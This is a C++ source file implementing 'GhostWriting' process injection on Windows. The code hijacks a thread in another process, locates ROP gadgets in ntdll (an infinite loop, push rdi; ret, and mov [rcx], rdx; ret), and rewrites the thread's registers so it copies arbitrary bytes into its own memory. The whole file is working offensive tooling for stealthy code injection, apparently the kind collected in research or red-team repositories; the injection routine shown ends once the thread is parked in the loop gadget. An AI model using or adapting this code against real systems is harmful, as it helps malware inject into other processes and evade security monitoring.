#include <iostream>
#include "GhostWritingInjection.h"
#include "ThreadContext.h"
#include "../Common/Utils.h"
#include "../Common/Process.h"

namespace
{
    bool is32BitsThread(HANDLE threadHandle)
    {
        DWORD pid = GetProcessIdOfThread(threadHandle);
        HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION , false, pid);
        BOOL isWow64 = false;
        if (!IsWow64Process(procHandle, &isWow64))
        {
            std::cerr << "IsWow64Process error " << GetLastError() << std::endl;
        }
        CloseHandle(procHandle);
        return isWow64;
    }
}

GhostWriter::GhostWriter(DWORD threadID)
{
    this->threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
    if (!this->threadHandle)
    {
        ThrowException(std::string("GhostWriter: OpenThread error ") + std::to_string(GetLastError()));
    }
    this->is32Bits = is32BitsThread(this->threadHandle);
}

HANDLE GhostWriter::GetThreadHandle()
{
    return this->threadHandle;
}

bool GhostWriter::SuspendThread()
{
    if (::SuspendThread(this->threadHandle) != (DWORD)-1)
    {
        return true;
    }
    std::cerr << "SuspendThread error " << GetLastError() << "\n";
    return false;
}

bool GhostWriter::ResumeThread()
{
    if (::ResumeThread(this->threadHandle) != (DWORD)-1)
    {
        return true;
    }
    std::cerr << "ResumeThread error " << GetLastError() << "\n";
    return false;
}

void GhostWriter::SetLoopGadget(BYTE* address)
{
    this->loopGadgetAddr = address;
}

void GhostWriter::SetPushGadget(BYTE* address)
{
    this->pushGadgetAddr = address;
}

void GhostWriter::SetWriteGadget(BYTE* address)
{
    this->writeGadgetAddr = address;
}

void GhostWriter::GetContext(void* context)
{
    bool success = false;
    this->SuspendThread();
    if (this->is32Bits)
    {
        PWOW64_CONTEXT contextPtr = reinterpret_cast<PWOW64_CONTEXT>(context);
        contextPtr->ContextFlags = CONTEXT_ALL;
        success = Wow64GetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(contextPtr));
    }
    else
    {
        LPCONTEXT contextPtr = reinterpret_cast<LPCONTEXT>(context);
        contextPtr->ContextFlags = CONTEXT_ALL;
        success = GetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(contextPtr));
    }

    if (!success)
    {
        std::cerr << "GetThreadContext error " << GetLastError() << "\n";
    }
    this->ResumeThread();
}

void GhostWriter::SetContext(void* context)
{
    bool success = false;
    this->SuspendThread();
    if (this->is32Bits)
    {
        success = Wow64SetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        success = SetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }

    if (!success)
    {
        std::cerr << "SetThreadContext error " << GetLastError() << "\n";
    }
    this->ResumeThread();
}

void GhostWriter::WriteBytes(BYTE* buffer, size_t bufferSize, uintptr_t where)
{
    unsigned int ptrSize = this->is32Bits ? 4 : 8;
    size_t newSize = bufferSize + ptrSize; // extra space for null bytes
    auto newBuffer = std::make_unique<BYTE[]>(newSize);
    memset(newBuffer.get(), 0, newSize);
    memcpy(newBuffer.get(), buffer, bufferSize);

    for (unsigned int i = 0; i < bufferSize; i += ptrSize)
    {
        uintptr_t what = reinterpret_cast<uintptr_t>(buffer + i);
        this->CallWriteGadget(what, where + i);
        this->WaitForLoop();
    }
}

void GhostWriter::WaitForLoop()
{
    ThreadContext context = ThreadContext(this->is32Bits);

    while (true)
    {
        this->SuspendThread();
        this->GetContext(context.GetContextPtr());
        this->ResumeThread();
        uintptr_t curr = context.GetRip();
        if (reinterpret_cast<uintptr_t>(this->loopGadgetAddr) == curr)
        {
            return;
        }
        Sleep(100);
    }
}

void GhostWriter::CallPushGadget()
{
    ThreadContext context = ThreadContext(this->is32Bits);

    this->SuspendThread();
    this->GetContext(context.GetContextPtr());
    context.SetRdi(reinterpret_cast<uintptr_t>(this->loopGadgetAddr));
    context.SetRip(reinterpret_cast<uintptr_t>(this->pushGadgetAddr));
    this->SetContext(context.GetContextPtr());
    this->ResumeThread();
}

void GhostWriter::CallWriteGadget(uintptr_t what, uintptr_t where)
{
    ThreadContext context = ThreadContext(this->is32Bits);

    this->SuspendThread();
    this->GetContext(context.GetContextPtr());
    context.SetRdx(what);
    context.SetRcx(where);
    context.SetRip(reinterpret_cast<uintptr_t>(this->writeGadgetAddr));
    this->SetContext(context.GetContextPtr());
    this->ResumeThread();
}

// ***********************************

namespace
{
    BYTE* FindLoopGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* loopGadgetPtr = peNtdll.ScanSections((BYTE*)"\xEB\xFE", "..", true);
        if (!loopGadgetPtr)
        {
            std::cerr << "Could not find loop gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(loopGadgetPtr);
    }

    // push rdi; ret;
    BYTE* FindPushGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* pushGadgetPtr = peNtdll.ScanSections((BYTE*)"\x57\xC3", "..", true);
        if (!pushGadgetPtr)
        {
            std::cerr << "Could not find push gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(pushGadgetPtr);
    }

    // mov qword ptr [rcx], rdx; ret;
    BYTE* FindWriteGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* writeGadgetPtr = nullptr;
        if (proc.is32Bits)
        {
            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x89\x11\xC3", "...", true);
        }
        else
        {
            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x48\x89\x11\xC3", "....", true);
        }

        if (!writeGadgetPtr)
        {
            std::cerr << "Could not find write gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(writeGadgetPtr);
    }
}

bool GhostWritingInjection(DWORD threadID, PE& dll)
{
    bool success = false;
    GhostWriter ghostWriter = GhostWriter(threadID);
    Process proc = Process(GetProcessIdOfThread(ghostWriter.GetThreadHandle()));

    if (proc.Open(PROCESS_QUERY_LIMITED_INFORMATION))
    {
        unsigned int contextSize = max(sizeof(CONTEXT), sizeof(WOW64_CONTEXT));
        auto originalContext = std::make_unique<BYTE[]>(contextSize);
        auto context = std::make_unique<BYTE[]>(contextSize);

        // find gadgets
        BYTE* loopGadgetAddr = FindLoopGadget(proc);
        BYTE* pushGadgetAddr = FindPushGadget(proc);
        BYTE* writeGadgetAddr = FindWriteGadget(proc);

        std::cout << std::hex;
        std::cout << "Loop gadget address: 0x" << (uintptr_t)loopGadgetAddr << "\n";
        std::cout << "Push gadget address: 0x" << (uintptr_t)pushGadgetAddr << "\n";
        std::cout << "Write gadget address: 0x" << (uintptr_t)writeGadgetAddr << "\n";

        ghostWriter.SetLoopGadget(loopGadgetAddr);
        ghostWriter.SetPushGadget(pushGadgetAddr);
        ghostWriter.SetWriteGadget(writeGadgetAddr);

        std::cout << "Calling push gadget...\n";
        ghostWriter.CallPushGadget();
        std::cout << "Waiting for loop...\n";
        ghostWriter.WaitForLoop();
        std::cout << "Thread is looping!\n";
    }
    else
    {
        std::cerr << "Could not open process\n";
    }
    return success;
}
